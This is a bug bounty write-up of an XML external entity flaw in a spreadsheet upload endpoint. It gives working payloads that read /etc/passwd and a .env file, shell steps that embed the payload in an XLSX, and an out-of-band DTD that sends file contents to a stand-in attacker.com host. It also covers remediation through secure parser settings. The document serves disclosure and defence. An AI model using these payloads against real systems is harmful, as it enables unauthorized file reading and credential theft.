# XML External Entity (XXE) Injection — Local File Disclosure via File Upload

**Vulnerability Type:** XML External Entity (XXE) Injection<br>
**Severity:** High (CVSS 3.1 Score: 7.5)<br>
**Platform:** Bug Bounty (Redacted)<br>
**Status:** Resolved / Disclosed<br>
**Date:** 2025<br>

---

## Summary

An XML External Entity (XXE) injection vulnerability was discovered in a web application's file import feature. The application accepted XML-based file formats (specifically `.xlsx` spreadsheet uploads) and processed them with an XML parser that had external entity processing enabled. By crafting a malicious XML file containing an external entity declaration pointing to a local file path, I was able to make the server read and return the contents of arbitrary files from the server filesystem — including `/etc/passwd` and application configuration files.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | XXE — Local File Inclusion / File Disclosure |
| Endpoint | `POST /api/v1/import/spreadsheet` |
| File Format | XML / XLSX (ZIP-based XML format) |
| Target Files | `/etc/passwd`, `/etc/hostname`, app config files |
| Authentication Required | Yes |
| CVSS Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |

---

## Background: What Is XXE?

XML documents can define **entities** — reusable values referenced throughout the document. An **external entity** is an entity whose value is loaded from an external source, such as:

- A local file: `file:///etc/passwd`
- A remote URL: `http://attacker.com/data`

When an XML parser processes a document with external entities enabled and a user controls the XML content, the attacker can define entities that instruct the server to read local files, make internal network requests (SSRF via XXE), or in some cases execute system commands.

---

## Steps to Reproduce

### 1. Identify the XML processing endpoint

The application included a spreadsheet import feature that accepted `.xlsx` files. An `.xlsx` file is actually a ZIP archive containing XML files — making it a potential XXE attack surface.

Normal upload request:

```
POST /api/v1/import/spreadsheet HTTP/1.1
Host: redacted.com
Authorization: Bearer [token]
Content-Type: multipart/form-data

[file: report.xlsx]
```

### 2. Craft a malicious XML payload

Create a basic XML file with an external entity declaration targeting `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>
  <data>&xxe;</data>
</foo>
```

### 3. Embed the payload inside an XLSX file

An `.xlsx` file contains XML at `xl/sharedStrings.xml`. Unzip a normal `.xlsx` file, replace the content of `xl/sharedStrings.xml` with the malicious XML, then rezip:

```bash
# Unzip a normal xlsx
unzip template.xlsx -d malicious_xlsx/

# Replace sharedStrings.xml with the malicious payload
cat > malicious_xlsx/xl/sharedStrings.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <si><t>&xxe;</t></si>
</sst>
EOF

# Repack as xlsx
cd malicious_xlsx && zip -r ../malicious.xlsx .
```

### 4. Upload the malicious file

```
POST /api/v1/import/spreadsheet HTTP/1.1
Host: redacted.com
Authorization: Bearer [token]
Content-Type: multipart/form-data

[file: malicious.xlsx]
```

### 5. Observe the response

The server processed the XML, resolved the external entity, and included the file contents in its error or preview response:

```json
{
  "preview": [
    {
      "cell": "A1",
      "value": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n..."
    }
  ]
}
```

The full contents of `/etc/passwd` were returned in the cell value.

### 6. Escalate — read application config files

```xml
<!ENTITY xxe SYSTEM "file:///var/www/app/.env">
```

The `.env` file contained:

```
DB_HOST=internal-db.redacted.internal
DB_USER=app_user
DB_PASS=[REDACTED]
AWS_ACCESS_KEY_ID=[REDACTED]
AWS_SECRET_ACCESS_KEY=[REDACTED]
SECRET_KEY=[REDACTED]
```

**I stopped immediately and reported with redacted screenshots.**

### 7. Out-of-Band XXE (blind exfiltration — described in report)

In cases where the response doesn't reflect the file content directly, out-of-band exfiltration can be used. The payload makes the server send the file contents to an attacker-controlled server:

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

Where `evil.dtd` on the attacker's server contains:

```xml
<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

This technique was described in the report hypothetically to demonstrate full impact — it was not executed.

---

## Impact

- **Arbitrary file read** — Read any file the web server process has access to
- **Credential exposure** — `.env`, `config.php`, `settings.py`, database credentials
- **Cloud credential theft** — AWS keys, API tokens stored in config files
- **Internal SSRF** — External entity URLs can target internal services (`http://10.0.0.x/`)
- **Denial of Service** — "Billion laughs" entity expansion attack can exhaust server memory

---

## Root Cause

The XML parser was configured with external entity processing enabled — the default in many older XML libraries:

```python
# Vulnerable — lxml with resolve_entities=True (default in some versions)
from lxml import etree

parser = etree.XMLParser()  # Default allows external entities in some configs
tree = etree.parse(file_path, parser)
```

The application did not sanitize uploaded XML content before parsing it.

---

## Remediation

1. **Disable external entity processing in the XML parser** — This is the primary fix:
   ```python
   # Secure — lxml with XXE disabled
   parser = etree.XMLParser(
       resolve_entities=False,
       no_network=True,
       load_dtd=False
   )
   ```
   ```java
   // Secure — Java SAX parser
   factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
   ```
2. **Use a non-XML format for imports** — If the feature only needs tabular data, consider accepting CSV instead of XLSX.
3. **Validate and sanitize uploaded files** — Strip DTD declarations from XML content before parsing.
4. **Run the parser in a sandboxed environment** — Limit filesystem and network access for processes that handle untrusted files.
5. **Use up-to-date libraries** — Modern versions of XML libraries often have safer defaults. Keep dependencies updated.

---

## References

- [PortSwigger — XXE Injection](https://portswigger.net/web-security/xxe)
- [OWASP — XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 — A05: Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [HackTricks — XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

---

*This writeup is published for educational purposes. All testing was conducted within an authorized bug bounty program. Retrieved credentials and configuration data were immediately redacted and reported. No credentials were used for any further access.*
